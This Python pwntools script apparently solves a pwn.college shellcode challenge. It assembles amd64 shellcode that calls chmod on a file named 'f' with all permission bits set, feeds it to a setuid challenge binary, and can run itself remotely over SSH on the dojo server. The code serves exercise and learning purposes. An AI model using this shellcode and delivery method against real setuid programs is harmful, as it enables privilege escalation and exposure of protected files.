import os
import sys
import pwn

pwn.context.arch = "amd64"
pwn.context.os = "linux"

shellcode = r"""
push 0x66
push rsp
pop rdi
push -1
pop rsi
mov al, 0x5a
syscall
"""
shellbyte: bytes = pwn.asm(shellcode)


def host():
    print(pwn.disasm(shellbyte))
    print(pwn.hexdump(shellbyte))


def hack(io: pwn.process):
    io.sendline(shellbyte)


def boot():

    def find_challenge(search_path="/challenge"):
        from pathlib import Path
        import stat

        xs = [
            str(f.absolute())
            for f in Path(search_path).iterdir()
            if f.is_file()
            and os.access(f, os.X_OK)
            and (f.stat().st_mode & stat.S_ISUID)
        ]
        if not xs:
            raise FileNotFoundError(f"No executable found in {search_path}")
        if len(xs) > 1:
            raise FileNotFoundError(f"Multiple executables found in {search_path}")
        return xs[0]

    with pwn.process(find_challenge()) as io:
        tee(io)
        hack(io)
        io.recvrepeat()


def main():
    me = "/tmp/pwnsolver.py"
    ssh = pwn.ssh(user="hacker", host="dojo.pwn.college", raw=True)
    ssh.upload(os.path.abspath(__file__), me)
    argv = ["/run/dojo/bin/python3", me]
    io: pwn.tubes.ssh.ssh_process
    io = ssh.process(argv, argv[0], aslr=True)  # type: ignore
    with io:
        tee(io)
        try:
            io.recvrepeat()
        except KeyboardInterrupt:
            if io.pid:
                ssh.system(f"kill {io.pid}").wait()
            io.kill()


def tee(process: pwn.tube):
    orig_send_raw = process.send_raw
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def send_raw(data, *args, **kwargs):
        output.write(data)
        output.flush()
        return orig_send_raw(data, *args, **kwargs)

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.send_raw = send_raw
    process.recv_raw = recv_raw


if __name__ == "__main__":
    host()
    if os.environ.get("DOJO_AUTH_TOKEN"):
        boot()
    else:
        main()
